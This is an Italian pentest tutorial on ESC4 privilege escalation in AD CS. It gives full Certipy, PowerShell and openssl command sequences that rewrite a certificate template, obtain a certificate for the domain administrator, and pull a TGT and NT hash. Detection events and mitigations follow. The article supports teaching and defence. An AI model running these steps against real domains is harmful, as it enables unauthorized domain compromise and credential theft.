---
title: 'ESC4 AD CS PrivEsc: Template Hijacking con Certipy'
slug: esc4-adcs
description: 'ESC4 ADCS Privilege Escalation: individua ACL deboli sui certificate template, trasformali in ESC1 con Certipy e analizza il percorso fino a Domain Admin.'
image: /BCO.9ce6ba52-ce57-472f-b167-52ab8931a51e.webp
draft: false
date: 2026-03-07T00:00:00.000Z
lastmod: 2026-06-23T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ESC4 ADCS
  - Certificate Template Hijacking
  - AD CS ACL Abuse
  - Certipy Template
  - Active Directory PrivEsc
---

# ESC4 in Active Directory Certificate Services: privilege escalation tramite permessi sui certificate template

ESC4 è una tecnica di privilege escalation su **Active Directory Certificate Services (AD CS)** che sfrutta **permessi pericolosi sull'oggetto certificate template** in AD. I certificate template sono oggetti AD come un altro — se un attaccante ha i permessi per modificarli, può trasformare un template sicuro in uno vulnerabile (tipicamente stile [ESC1](https://hackita.it/articoli/esc1-adcs/)) e ottenere certificati per qualsiasi utente del dominio.

Il punto da chiarire fin da subito: **ESC4 è la misconfigurazione dei permessi**, non la garanzia che l'intera catena — modifica, emissione, autenticazione — vada a buon fine. Il template deve anche essere pubblicato sulla CA giusta, i permessi di modifica non sono la stessa cosa dei permessi di enrollment, e il ripristino del template non annulla ciò che è stato emesso nel frattempo.

I template vivono in AD sotto:

```
CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration
```

## Glossario rapido

| Termine                                                 | Significato in una riga                                                                                                 |
| ------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| **Certificate template (oggetto AD)**                   | L'oggetto in AD che definisce come un certificato viene emesso — EKU, subject, approvazioni, ACL.                       |
| **GenericAll / WriteDACL / WriteOwner / WriteProperty** | Permessi AD che, se posseduti su un template, permettono di modificarlo o di modificarne i permessi.                    |
| **msPKI-Certificate-Name-Flag**                         | Attributo che controlla, tra l'altro, se il richiedente può fornire da sé il Subject/SAN (`ENROLLEE_SUPPLIES_SUBJECT`). |
| **pKIExtendedKeyUsage**                                 | Gli EKU del certificato risultante.                                                                                     |
| **msPKI-Certificate-Application-Policy**                | Le Application Policies del certificato — attributo correlato all'EKU ma distinto, non un semplice "override".          |
| **msPKI-Enrollment-Flag**                               | Flag che controllano, tra l'altro, se serve l'approvazione di un manager.                                               |
| **msPKI-RA-Signature**                                  | Numero di firme (certificati agente) richieste per approvare una richiesta.                                             |
| **nTSecurityDescriptor**                                | La DACL dell'oggetto template — chi può leggerlo, modificarlo, farne enrollment.                                        |
| **Enroll / Autoenroll**                                 | Diritti di **richiesta** di un certificato — concettualmente distinti dai diritti di **modifica** del template.         |

## Quando esiste ESC4: permessi effettivi, non solo nomi di permessi

ESC4 è potenzialmente sfruttabile quando un utente (o un gruppo di cui fa parte) ha uno di questi permessi sull'oggetto template:

```
GenericAll / FullControl
WriteDACL
WriteOwner
WriteProperty (su attributi specifici)
Owner
```

Ma "il permesso compare nell'output" non equivale a "la catena è praticabile". Vanno distinti almeno:

| Permesso/condizione              | Cosa ti permette realmente                                                                                                        |
| -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| **GenericAll / Full Control**    | Controllo ampio sull'oggetto — valuta comunque separatamente i permessi di enrollment risultanti                                  |
| **WriteProperty / GenericWrite** | Può permettere di modificare attributi utili alla catena, **in base alla ACE specifica** — non tutte le WriteProperty sono uguali |
| **WriteDACL**                    | Permette di modificare i permessi dell'oggetto (es. concederti GenericAll)                                                        |
| **WriteOwner**                   | Può permettere di diventare owner e, da lì, ottenere ulteriore controllo — non è un controllo immediato equivalente a GenericAll  |
| **Owner**                        | Può dare margine per intervenire sulla DACL, nei limiti dei permessi applicabili                                                  |
| **Enroll / Autoenroll**          | Diritti di **richiesta** del certificato — non sono sinonimi dei diritti di modifica del template                                 |

Verifica anche: ACE ereditate, appartenenza a gruppi annidati, e se il tuo diritto riguarda l'intero oggetto o solo attributi specifici.

## Identificazione

### Da Kali con Certipy

```bash
certipy find -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100 -vulnerable -stdout
```

Output tipico quando c'è ESC4:

```
Template Name                 : Web
[...]
Object Control Permissions
  Full Control Principals     : CORP\webdevelopers

[!] Vulnerabilities
  ESC4 : 'CORP\\webdevelopers' has dangerous permissions on the template
```

**Correzione importante**: Certipy e Certify **rilevano ESC4 anche quando il template è ancora configurato in modo sicuro** — l'indicatore si basa sui permessi dell'oggetto, non sulla configurazione attuale delle EKU. Se l'enumerazione non segnala nulla, prima di concludere che l'ACL è sicura verifica: versione dello strumento, DC interrogato, identità usata per l'enumerazione, appartenenze a gruppi e, soprattutto, se esistono ACE specifiche che lo strumento potrebbe non aver interpretato come "pericolose" nel contesto del tuo scenario.

### Da Windows con Certify

```powershell
.\Certify.exe enum-templates --filter-vulnerable --hide-admins
```

Nota: questa è la sintassi di **Certify 2.x** (`enum-templates --filter-vulnerable`). Versioni precedenti (Certify 1.x) usavano `Certify.exe find /vulnerable`. Dichiara sempre la versione che stai usando: le sintassi non sono intercambiabili.

Nell'output cerca `Full Control Principals` o `WriteDACL Principals` con utenti non amministrativi.

### Con certutil nativo

```powershell
certutil -catemplates
```

**Correzione importante**: questo comando mostra i template **pubblicati sulla CA**, non i tuoi diritti di enrollment. `Auto-Enroll` nell'output riflette la configurazione del template mostrata dalla CA, non è una prova diretta che il tuo account specifico abbia Enroll/Autoenroll — quello va verificato separatamente sull'ACL del template (Certipy, Certify, BloodHound, o una query LDAP diretta). Usa questo comando solo per confermare che il template è disponibile sulla CA, non come test di permessi.

## Attributi che contano per l'exploitation

| Attributo                              | Ruolo                                                                        | Cosa verificare                                                                                                |
| -------------------------------------- | ---------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| `msPKI-Certificate-Name-Flag`          | Se il richiedente può fornire da sé il subject (`ENROLLEE_SUPPLIES_SUBJECT`) | È il requisito **centrale** per uno scenario stile ESC1 — senza questo flag, modificare solo gli EKU non basta |
| `pKIExtendedKeyUsage`                  | Gli EKU previsti                                                             | Deve includere un'EKU che abilita l'autenticazione (es. Client Authentication)                                 |
| `msPKI-Certificate-Application-Policy` | Le Application Policies inserite nel certificato                             | Attributo correlato ma distinto dall'EKU — non lo "sovrascrive", concorre a determinare le estensioni finali   |
| `msPKI-Enrollment-Flag`                | Manager approval e altri flag di enrollment                                  | Deve essere compatibile con un'emissione senza approvazione manuale, se è quello lo scenario                   |
| `msPKI-RA-Signature`                   | Firme autorizzate richieste                                                  | Se >0, blocca l'emissione con un solo certificato                                                              |
| `nTSecurityDescriptor`                 | La DACL dell'oggetto                                                         | Chi può modificare il template, chi può modificarne la DACL, chi può farne enrollment                          |

## Exploitation

L'attacco si divide in: modificare il template, richiedere il certificato, autenticarsi, ripristinare.

### Metodo 1 — Certipy da Kali (hai credenziali)

**Step 1 — Modifica il template**

```bash
certipy template \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip 10.0.0.100 \
  -template NomeTemplate \
  -save-configuration NomeTemplate.json \
  -write-default-configuration
```

`-save-configuration` salva la configurazione originale in JSON prima di modificare (su Certipy v5.x; il flag `-save-old` delle versioni v4.x non esiste più). `-write-default-configuration` applica la configurazione predefinita ESC1 di Certipy — ed è più invasiva di quanto sembri. Dal codice di Certipy, questa configurazione:

* imposta `msPKI-Certificate-Name-Flag = ENROLLEE_SUPPLIES_SUBJECT` (il richiedente fornisce il subject);
* imposta `pKIExtendedKeyUsage` e `msPKI-Certificate-Application-Policy` su **Client Authentication** (solo questa, non Smart Card Logon);
* azzera `msPKI-RA-Signature` (nessuna firma richiesta) e `msPKI-Enrollment-Flag` (nessuna manager approval);
* **rimpiazza la DACL del template (`nTSecurityDescriptor`)** concedendo il **controllo completo al tuo SID**.

Quest'ultimo punto è quello che la maggior parte delle guide omette: la modifica non toccano solo EKU e subject, ma allarga anche i permessi sull'oggetto stesso durante la finestra di attacco. Registra sempre lo stato iniziale (il JSON lo fa) e, dopo il ripristino, verifica che la configurazione effettiva corrisponda davvero alla baseline — non solo che il comando di ripristino sia andato a buon fine senza errori.

**Step 2 — Richiedi il certificato**

```bash
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip 10.0.0.100 \
  -target ca.corp.local -ca CORP-CA \
  -template NomeTemplate \
  -upn 'administrator@corp.local'
```

Certipy genera direttamente il PFX.

**Step 3 — Autenticati**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100
```

```
Got TGT
Got NT hash for 'administrator@corp.local'
```

**Step 4 — Ripristina il template**

```bash
certipy template \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip 10.0.0.100 \
  -template NomeTemplate \
  -write-configuration NomeTemplate.json
```

Importante: il ripristino riporta gli **attributi** allo stato salvato, ma **non revoca i certificati emessi nel frattempo** e non elimina gli eventi di audit generati durante la finestra di modifica. In un engagement reale, dopo il ripristino verifica anche se sono stati emessi certificati con quella configurazione temporanea e valutane la gestione (revoca se necessario).

### Metodo 2 — PowerShell da Windows (hai shell sull'host)

Usa questo metodo quando sai — da BloodHound o dall'output di Certify/Certipy — di avere GenericAll, WriteDACL o WriteProperty rilevanti su un template, e preferisci non caricare Certipy sull'host.

**Correzione critica rispetto alla versione precedente di questa guida**: aggiungere solo gli EKU **non è sufficiente** a riprodurre uno scenario stile ESC1. Manca il passaggio più importante — impostare `msPKI-Certificate-Name-Flag` con `ENROLLEE_SUPPLIES_SUBJECT`, che è ciò che permette alla richiesta di contenere un subject/SAN fornito da te. Senza questo flag, il template continua a costruire il subject secondo le regole AD normali, e la richiesta "intestata ad Administrator" dello Step 2 non produce l'effetto descritto.

**Step 1 — Modifica gli attributi necessari**

Identifica prima il template reale nel tuo laboratorio e il suo stato iniziale (non generalizzare: template diversi hanno EKU di partenza diverse — alcuni built-in come `User` o `WorkstationAuthentication` includono già Client Authentication, altri no). Poi:

```powershell
$EKUs = @("1.3.6.1.5.5.7.3.2")  # Client Authentication

Set-ADObject "CN=NomeTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dominio,DC=htb" `
  -Add @{
    pKIExtendedKeyUsage = $EKUs
    "msPKI-Certificate-Application-Policy" = $EKUs
  } `
  -Replace @{ "msPKI-Certificate-Name-Flag" = 1 }
```

Nota: `msPKI-Certificate-Name-Flag = 1` corrisponde al bit `ENROLLEE_SUPPLIES_SUBJECT` — se l'attributo ha già altri flag impostati, usa un OR bit a bit sul valore esistente invece di sovrascriverlo a `1`, per non perdere configurazioni preesistenti. Lo Smart Card Logon EKU (`1.3.6.1.4.1.311.20.2.2`) **non è un requisito universale**: aggiungilo solo se il tuo DC lo richiede per quello specifico scenario di autenticazione, non per abitudine.

Per capire il ruolo di ogni OID: [EKU OID in AD CS: guida per il pentest](https://hackita.it/articoli/adcs-eku-oid-offensive/).

Questo flusso richiede il modulo PowerShell Active Directory (non è "zero tool aggiuntivi" come a volte si legge — `Set-ADObject` ne fa parte).

**Step 2 — Genera la cert request da Kali**

```bash
cat > admin.cnf << EOF
[ req ]
default_bits = 2048
prompt = no
req_extensions = user
distinguished_name = dn

[ dn ]
CN = Administrator

[ user ]
subjectAltName = otherName:msUPN;UTF8:administrator@dominio.htb
EOF

openssl req -config admin.cnf \
  -subj "/DC=htb/DC=dominio/CN=Users/CN=Administrator" \
  -new -nodes -sha256 -out administrator.req -keyout administrator.key
```

**Step 3 — Fai firmare la request dalla CA**

```powershell
certreq -submit -config "earth.dominio.htb\NOME-CA" `
  -attrib "CertificateTemplate:NomeTemplate" administrator.req administrator.cer
```

Questo passaggio presuppone che tu abbia già diritti di **enrollment** (non solo di modifica) sul template, e che il template sia pubblicato su quella CA — verifica entrambe le cose separatamente, non assumerle.

**Step 4 — Crea il PFX e autenticati**

```bash
openssl pkcs12 -export -in administrator.cer -inkey administrator.key -out administrator.pfx
certipy auth -pfx administrator.pfx -dc-ip <IP_DC>
```

**Step 5 — Ripristina il template**

```powershell
Set-ADObject "CN=NomeTemplate,CN=Certificate Templates,..." `
  -Remove @{ pKIExtendedKeyUsage = $EKUs; "msPKI-Certificate-Application-Policy" = $EKUs } `
  -Replace @{ "msPKI-Certificate-Name-Flag" = 0 }  # solo se il valore originale era davvero 0
```

Attenzione: se uno di questi valori era già presente **prima** della tua modifica, una rimozione cieca lo elimina comunque. Confronta sempre i valori prima/dopo — non limitarti a rimuovere ciò che hai aggiunto tu, verifica che il risultato coincida con lo stato iniziale documentato.

## Validare il risultato, non solo l'ultimo output

| Risultato                      | Cosa dimostra                                    | Verifica successiva                                                                                    |
| ------------------------------ | ------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| Modifica del template riuscita | Gli attributi sono stati scritti                 | Confronta i valori effettivi con quelli attesi                                                         |
| Certificato emesso             | La CA ha approvato la richiesta                  | Verifica template, subject, SAN, EKU, Request ID                                                       |
| `Got TGT`                      | L'autenticazione Kerberos è riuscita             | Distinguilo dall'accesso effettivo a una risorsa                                                       |
| `Got NT hash`                  | È stata recuperata quella specifica informazione | Non è garantito in ogni ambiente — dipende anche da certificate mapping e configurazione PKINIT del DC |

## Limite importante: la misconfigurazione ACL non è l'emissione

ESC4 descrive una **ACL pericolosa sul template**, non la garanzia di poter completare l'emissione. Per quello serve anche che il template sia **pubblicato sulla CA** che gestirà la richiesta, e che tu abbia diritti di **enrollment** (distinti da quelli di modifica). Se il template esiste in AD ma non è pubblicato su nessuna CA, la tua `certreq`/`certipy req` fallirà — ma questo non significa che l'ACL sia sicura, significa solo che quello specifico percorso di emissione ha bisogno di una condizione aggiuntiva. [ESC7](https://hackita.it/articoli/esc7-adcs/) (permessi pericolosi sulla CA) è *una* via per arrivare a pubblicare un template, non l'unica: verifica separatamente chi può modificare il template e chi può pubblicarlo.

## Troubleshooting

| Sintomo                                                                                  | Cosa verificare                                                                                                                            |
| ---------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| Certipy/Certify non segnalano ESC4 su un template che ti aspetti                         | Versione dello strumento, DC interrogato, identità usata, gruppi annidati, ACE specifiche non generiche                                    |
| `certutil -catemplates` mostra il template ma la richiesta fallisce                      | Quel comando non prova i tuoi diritti di enrollment — verifica l'ACL con Certipy/Certify/BloodHound                                        |
| Step 1 (modifica) riesce ma la richiesta del certificato non produce il subject previsto | Hai dimenticato `msPKI-Certificate-Name-Flag`/`ENROLLEE_SUPPLIES_SUBJECT` — senza, il subject non viene preso dalla tua richiesta          |
| La richiesta viene messa in sospeso                                                      | `msPKI-Enrollment-Flag` richiede ancora manager approval, o `msPKI-RA-Signature` richiede firme                                            |
| `certreq`/`certipy req` fallisce nonostante l'ACL sia favorevole                         | Il template non è pubblicato su quella CA, oppure non hai diritti di enrollment (distinti da quelli di modifica)                           |
| Certificato emesso ma l'autenticazione fallisce                                          | Possibile problema di certificate mapping sul DC, non di ESC4 — verifica PKINIT e mapping del certificato                                  |
| Il ripristino sembra riuscito ma qualcosa non torna                                      | Confronta attributo per attributo con il backup JSON/i valori annotati — una rimozione "alla cieca" può aver eliminato valori preesistenti |

## Detection

**Event ID 5136** (A directory service object was modified) è utile ma **non automatico**: richiede che l'auditing "Directory Service Changes" sia configurato sui DC e che l'oggetto template sia coperto da una SACL adeguata — non si genera semplicemente perché "un account non amministrativo PKI" ha modificato il template. Monitora in particolare le modifiche a: `msPKI-Certificate-Name-Flag`, `pKIExtendedKeyUsage`, `msPKI-Certificate-Application-Policy`, `msPKI-Enrollment-Flag`, `msPKI-RA-Signature`, `nTSecurityDescriptor`.

**Eventi 4886/4887/4888** sulla CA (richiesta ricevuta/emessa/negata): correla richiedente, template, Request ID e, dove disponibile, subject/SAN del certificato emesso. Un certificato intestato a un account privilegiato ma richiesto da un'identità ordinaria è un segnale da investigare — non una prova isolata, perché esistono flussi legittimi che emettono certificati con subject diverso dal richiedente.

**Event ID 4768 con `PreAuthType=16`** (PA-PK-AS-REQ) indica un'autenticazione Kerberos basata su certificato — comune anche in scenari smart card legittimi. Non è prova di ESC4 da solo: correlalo con l'emissione del certificato, il suo Request ID e con eventuali modifiche al template avvenute poco prima.

## Mitigation

* **ACL dei template**: rimuovi diritti di scrittura, controllo della DACL e ownership non necessari; verifica gruppi annidati ed ereditarietà delle ACE. Solo `Enterprise Admins` e gruppi PKI dedicati dovrebbero poter scrivere sui template.
* **Separazione dei privilegi**: chi amministra i template non dovrebbe coincidere, per default, con chi può richiedere certificati con EKU sensibili.
* **Pubblicazione sulle CA**: rivedi periodicamente quali template sono pubblicati su ciascuna CA e rimuovi quelli non necessari, dopo aver valutato le dipendenze.
* **Baseline**: mantieni e confronta periodicamente una baseline degli attributi e dei permessi attesi sui template critici.
* **Certificati già emessi**: in caso di abuso sospetto, identifica i certificati emessi durante la finestra di modifica e valutane la revoca — poi verifica che la revoca sia effettiva.
* **Monitoraggio**: raccogli eventi AD (5136) e CA (4886-4888, 4768), con retention adeguata, e testa effettivamente gli alert — non limitarti a configurare l'auditing senza verificarlo.

Nota: il manager approval da solo non è un rimedio sufficiente se la stessa identità non autorizzata può modificare gli attributi che governano proprio quell'approvazione.

## FAQ

**ESC4 modifica la CA?**
No — modifica solo l'oggetto template in AD. La CA non viene toccata direttamente.

**Se ho solo WriteDACL posso fare ESC4?**
Potenzialmente sì — con WriteDACL puoi modificare i permessi dell'oggetto per darti controllo più ampio — ma l'impatto reale dipende dalle autorizzazioni effettive risultanti, non è automatico.

**Devo ripristinare il template?**
Sì, sempre, in produzione. Ma ripristinare gli attributi non revoca i certificati già emessi né elimina gli eventi di audit generati nel frattempo — verifica entrambi separatamente.

**Perché Certipy non segnala ESC4 su un template che mi aspetto sia vulnerabile?**
Verifica versione dello strumento, DC interrogato e identità usata prima di concludere che l'ACL sia sicura — Certipy valuta i permessi effettivi, non solo pattern generici.

**Qual è la differenza tra Enroll/Autoenroll e i permessi di modifica (WriteProperty/GenericAll)?**
Sono due cose distinte: Enroll/Autoenroll ti permette di *richiedere* un certificato secondo la configurazione attuale; i permessi di modifica ti permettono di *cambiare* quella configurazione. ESC4 riguarda i secondi.

***

Guida completa a tutte le tecniche ESC1–ESC16: [AD CS Privilege Escalation con Certipy](https://hackita.it/articoli/adcs-esc1-esc16/). Per gli OID EKU citati in questo articolo: [EKU OID in AD CS](https://hackita.it/articoli/adcs-eku-oid-offensive/).

Fonti tecniche: [Certipy — Privilege Escalation Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation), [Certified Pre-Owned — SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf).
